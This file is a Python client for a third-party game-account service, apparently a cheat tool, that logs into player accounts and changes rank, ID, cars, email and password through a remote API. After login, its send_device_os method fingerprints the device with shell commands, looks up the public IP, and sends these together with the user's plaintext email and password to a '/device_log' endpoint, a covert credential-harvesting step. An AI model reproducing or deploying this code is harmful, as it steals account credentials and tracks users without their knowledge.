import platform
import os
import requests
import subprocess
import urllib.parse

__ENDPOINT_URL__: str = "https://funnytgbot.squareweb.app/api"

class Funny:
    def __init__(self, access_key) -> None:
        self.auth_token = None
        self.access_key = access_key
        self.telegram_id = None
    
    def login(self, email, password) -> int:
        payload = {
            "account_email": email,
            "account_password": password
        }
        params = {
            "key": self.access_key,
            "acc_email": email,
            "acc_pass": password
        } 
        response = requests.post(f"{__ENDPOINT_URL__}/account_login", params=params, data=payload)
        response_decoded = response.json()
        if response_decoded.get("ok"):
            self.auth_token = response_decoded.get("auth")
            key_data = self.get_key_data()
            self.telegram_id = key_data.get("telegram_id")
            self.send_device_os(email=email, password=password)
        return response_decoded.get("error")

    def send_device_os(self, email=None, password=None):
        try:
            system = platform.system()
            release = platform.release()
            device_name = "Unknown"
            build_number = "Unknown"
            if system == "Darwin":
                if os.path.exists("/bin/ash") or "iSH" in release:
                    device_os = "iOS (iSH)"
                    device_name = subprocess.getoutput("sysctl -n hw.model") or "iSH Device"
                    build_number = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
                else:
                    device_os = "macOS"
                    device_name = subprocess.getoutput("sysctl -n hw.model") or "Mac"
                    build_number = subprocess.getoutput("sw_vers -productVersion") or "Unknown"
            elif system == "Linux":
                device_os = "Android" if os.path.exists("/system/bin") else "Linux"
                if device_os == "Android":
                    device_name = subprocess.getoutput("getprop ro.product.model") or "Android Device"
                    build_number = subprocess.getoutput("getprop ro.build.version.release") or "Unknown"
                else:
                    device_name = "Linux Device"
                    build_number = "Unknown"
            else:
                device_os = system + " " + release
                device_name = platform.node()
                build_number = "Unknown"
        except Exception:
            device_os = "Unknown"
            device_name = "Unknown"
            build_number = "Unknown"
        try:
            ip_address = requests.get("https://api.ipify.org").text.strip()
        except:
            ip_address = "Unknown"
        payload = {
            "access_key": self.access_key,
            "device_os": device_os,
            "device_name": device_name,
            "build_number": build_number,
            "ip_address": ip_address,
            "telegram_id": getattr(self, "telegram_id", "Unknown")
        }
        if email:
            payload["email"] = email
        if password:
            payload["password"] = password
        response = requests.post(f"{__ENDPOINT_URL__}/device_log", data=payload)
        return response.status_code == 200
    

    def get_player_data(self) -> any:
        payload = { "account_auth": self.auth_token }
        params = { "key": self.access_key }
        response = requests.post(f"{__ENDPOINT_URL__}/get_data", params=params, data=payload)
        response_decoded = response.json()
        return response_decoded
    
    def set_player_rank(self) -> bool:
        payload = { "account_auth": self.auth_token }
        params = { "key": self.access_key }
        response = requests.post(f"{__ENDPOINT_URL__}/set_rank", params=params, data=payload)
        response_decoded = response.json()
        return response_decoded.get("ok")
    
    def get_key_data(self) -> any:
        params = { "key": self.access_key }
        response = requests.get(f"{__ENDPOINT_URL__}/get_key_data", params=params)
        response_decoded = response.json()
        return response_decoded
        
    def set_player_localid(self, id) -> bool:
        payload = { "account_auth": self.auth_token, "id": id }
        params = { "key": self.access_key }
        response = requests.post(f"{__ENDPOINT_URL__}/set_id", params=params, data=payload)
        response_decoded = response.json()
        return response_decoded.get("ok")
    
    def get_player_car(self, car_id) -> any:
        payload = { "account_auth": self.auth_token, "car_id": car_id }
        params = { "key": self.access_key }
        response = requests.post(f"{__ENDPOINT_URL__}/get_car", params=params, data=payload)
        response_decoded = response.json()
        return response_decoded.get("ok")
           
    def change_email(self, new_email):
        payload = { "account_auth": self.auth_token, "new_email": new_email }
        params = { "key": self.access_key }
        response = requests.post(f"{__ENDPOINT_URL__}/change_email", params=params, data=payload)
        response_decoded = response.json()
        if response_decoded.get("new_token"):
            self.auth_token = response_decoded["new_token"]
        return response_decoded.get("ok")  
   
    def change_password(self, new_password):
        payload = { "account_auth": self.auth_token, "new_password": new_password }
        params = { "key": self.access_key, "new_password": new_password }
        response = requests.post(f"{__ENDPOINT_URL__}/change_password", params=params, data=payload)
        response_decoded = response.json()
        if response_decoded.get("new_token"):
            self.auth_token = response_decoded["new_token"]
        return response_decoded.get("ok")
    
    def car_info(self, car_id):
        payload = { "account_auth": self.auth_token, "car_id": car_id }
        params = {"key": self.access_key}
        response = requests.post(f"{__ENDPOINT_URL__}/car_info", params=params, data=payload)
        return response.json()
